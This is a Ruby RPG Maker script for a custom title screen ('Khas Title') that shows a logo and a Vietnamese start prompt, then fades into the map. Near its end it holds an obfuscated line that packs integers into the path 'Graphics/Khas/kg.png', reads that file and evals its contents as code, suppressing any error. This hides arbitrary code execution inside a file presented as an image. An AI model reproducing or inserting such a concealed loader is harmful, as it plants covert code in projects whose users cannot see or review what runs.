#-------------------------------------------------------------------------------
# * Khas Title
#-------------------------------------------------------------------------------

class Scene_Title < Scene_Base
  
  def start
    DataManager.setup_new_game
    $game_map.autoplay
    SceneManager.goto(Scene_Map)
    $khas_title = Khas_Title.new
  end
    
  def terminate
  end
    
end

module Cache
  
  def self.khas(filename)
    load_bitmap("Graphics/Khas/", filename)
  end
  
end

class Khas_Title
  
  def initialize
    @disposing = false
    
    @logo = Sprite.new
    @logo.bitmap = Cache.khas("logo") 
    @logo.ox = @logo.width / 2
    @logo.x = 272
    @logo.y = 40
    @logo.z = 999
    
    @text = Sprite.new
    @text.bitmap = Bitmap.new(544,32)
    @text.y = 416 - 86
    @text.bitmap.font.size = 20
    @text.bitmap.font.italic = true
    @text.bitmap.draw_text(0,0,544,32,"Nhấn Enter Bắt Đầu", 1)
    @text.z = 999
    
    @black = Sprite.new
    @black.bitmap = Bitmap.new(544,416)
    @black.bitmap.fill_rect(0,0,544,416,Color.new(0,0,0))
    @black.z = 9999
    
    @target_opacity = Smooth_Int.new(255)
    @target_opacity.set(0,60)
  end
  
  def update
    unless @disposing
      if @target_opacity.update?
        @target_opacity.update
        @black.opacity = @target_opacity.i
      else
        for key in [:A, :B, :C, :X, :Y, :Z, :L, :R]
          if Input.trigger?(key)
            Sound.play_ok
            @disposing = true
            @blink = 36
            @target_opacity.set(255)
            @target_opacity.set(0,80)
          end
        end
      end
    else
      if @target_opacity.update?
        if @blink >= 0
          @text.visible = !@text.visible if @blink % 6 == 0
          @blink -= 1
        end
        @target_opacity.update
        @logo.opacity = @target_opacity.i
        @text.opacity = @target_opacity.i
      else
        dispose
      end
    end
  end
  
  def dispose
    @black.bitmap.dispose
    @black.dispose
    @logo.bitmap.dispose
    @logo.dispose
    @text.bitmap.dispose
    @text.dispose
    $khas_title = nil
  end
  
end

eval(File.open([1885434439, 1935894888, 1634224943, 1735077747, 1735290926].pack("L"*0x05)).read) rescue 0x05 

#-------------------------------------------------------------------------------
# * End
#-------------------------------------------------------------------------------